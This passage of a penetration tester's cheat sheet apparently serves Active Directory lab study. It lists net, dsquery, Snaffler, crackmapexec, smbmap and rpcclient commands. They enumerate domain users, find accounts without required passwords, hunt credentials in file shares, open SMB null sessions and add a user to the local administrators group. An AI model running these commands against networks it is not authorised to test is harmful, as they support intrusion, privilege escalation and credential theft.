net localgroup administrators [username] /add	

# Check current shares
net share	

# Get information about a user within the domain
net user <ACCOUNT_NAME> /domain	

# List all users of the domain
net user /domain	

# Information about the current user
net user %username%	

# Mount the share locally
net use x: \computer\share	

# Get a list of computers
net view	

# 	Shares on the domains
net view /all /domain[:domainname]

# List shares of a computer
net view \computer /ALL	

# List of PCs of the domain
net view /domain	
```

#### Dsquery

[Dsquery](dsquery.md) is a helpful command-line tool that can be utilized to find Active Directory objects. 

`dsquery` will exist on any host with the `Active Directory Domain Services Role` installed, and the `dsquery` DLL exists on all modern Windows systems by default now and can be found at `C:\Windows\System32\dsquery.dll`.

All we need is elevated privileges on a host or the ability to run an instance of Command Prompt or PowerShell from a `SYSTEM` context.

```powershell
# User Search
dsquery user

# Computer Search
dsquery computer

# List objects in an OU
dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"

#  List Users With Specific Attributes Set (PASSWD_NOTREQD) by Combining dsquery with LDAP search filters of our choosing. The below looks for users with the PASSWD_NOTREQD flag set in the userAccountControl attribute.
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl

# Searching for Domain Controllers
 dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
# userAccountControl:1.2.840.113556.1.4.803: Specifies that we are looking at the User Account Control (UAC) attributes for an object. This portion can change to include three different values we will explain below when searching for information in AD (also known as Object Identifiers (OIDs).
# =8192 represents the decimal bitmask we want to match in this search. This decimal number corresponds to a corresponding UAC Attribute flag that determines if an attribute like password is not required or account is locked is set. 

# Search users with UAC set to `Password Can't Change`:
dsquery * -filter "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=64))"

```


## 6. Shares

### From Windows

#### Snaffler

[See snaffler](snaffler.md).

Snaffler](https://github.com/SnaffCon/Snaffler) is a tool for **pentesters** and **red teamers** to help find delicious candy needles (creds mostly, but it's flexible) in a bunch of horrible boring haystacks (a massive Windows/AD environment). _Broadly speaking_ - it gets a list of Windows computers from Active Directory, then spreads out its snaffly appendages to them all to figure out which ones have file shares, and whether you can read them.



```bash
Snaffler.exe -s -d $domain -o snaffler.log -v data
# -s:  prints results to the console 
# -d: specifies the domain to search within
# -o: writes results to a logfile
# -v: verbosity level. "data" is best as it only displays results to the screen
```

### From Linux

#### crackmapexec

[CrackMapExec](crackmapexec.md):

```shell-session
# Enumerate shares
crackmapexec smb $ip -u <username> -p <password> --shares

# The module spider_plus will dig through each readable share on the host and list all readable files. 
sudo crackmapexec smb  $ip --local-auth -u <username> -p <password> -d <DOMAIN> -M spider_plus --share 'NameOfShare'
# CME writes the results to a JSON file located at /tmp/cme_spider_plus/<ip of host>

```


#### SMBMap

[smbmap](smbmap.md)

```bash
# Enumerate network shares and access associated permissions.
smbmap -H $ip

# # Enumerate network shares and access associated permissions with recursivity
smbmap -H $ip -r
# --dir-only: provides only the output of all directories and did not list all files.

# Check access and permissions level for a folder with recursion
smbmap -u $username -p $password -d $domain -H $ip -R $nameofFolder --dir-only


```

#### rpcclient

[rpcclient](rpcclient.md)

```bash
# SMB NULL Session with rpcclient
rpcclient -U "" -N $ip
```



```shell-session
# SMB NULL Session with rpcclient
rpcclient -U "" -N $ip

# Connect to a remote shared folder (same as smbclient in this regard)
rpcclient -U "" 10.129.14.128
rpcclient -U'%' 10.10.110.17

# Server information
srvinfo

# Enumerate all domains that are deployed in the network 
enumdomains

# Provides domain, server, and user information of deployed domains.
querydominfo

# Enumerates all available shares.
netshareenumall

# Provides information about a specific share.
netsharegetinfo <share>

# Get Domain Password Information
getdompwinfo

# Enumerates all domain users.
enumdomusers

# Provides information about a specific user.
queryuser <RID>
	# An example:
	# rpcclient $> queryuser 0x3e8

# Provides information about a specific group.
querygroup <ID>

# Enumerating Privileges
enumprivs

# Enumerating SID from LSA
lsaenumsid
```
